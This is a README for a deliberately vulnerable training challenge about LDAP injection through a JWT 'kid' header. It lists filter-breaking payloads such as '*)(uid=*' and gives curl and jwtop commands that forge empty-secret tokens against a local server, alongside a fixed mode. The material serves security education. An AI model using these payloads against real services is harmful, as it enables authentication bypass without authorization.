# JWT KID LDAP Injection

This challenge demonstrates a JWT implementation that looks up the signing key in an LDAP directory with a filter built from the unescaped `kid` header: `(&(objectClass=jwtSigningKey)(kid=<kid>))`, keeping the first matching entry. Filter metacharacters in `kid` (`*`, `(`, `)`) widen the search, and the first entry returned is a key waiting for rotation whose secret is empty, so a token signed with an empty secret is accepted.

The directory is simulated in memory with a minimal RFC 4515 filter evaluator; like many LDAP clients, it ignores whatever follows the first complete filter.

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: kid is concatenated into the LDAP filter
go run main.go serve --vulnerable=true

# fixed: kid is escaped (RFC 4515) and disabled keys are refused
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
TOKEN=$(go run main.go jwt)

# one forged token per LDAP payload ("*)(uid=*", "*)(|(uid=*", "*)(objectClass=*", ...), signed with an empty secret
jwtop exploit kidinjection "$TOKEN" --mode ldap --all | while read -r FORGED; do
  curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080 -H "Authorization: Bearer $FORGED"
done
# vulnerable -> 204 for every payload that keeps the filter well-formed, fixed -> 401 for all

FORGED=$(jwtop exploit kidinjection "$TOKEN" --mode ldap)
curl -i http://localhost:8080 -H "Authorization: Bearer $FORGED"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
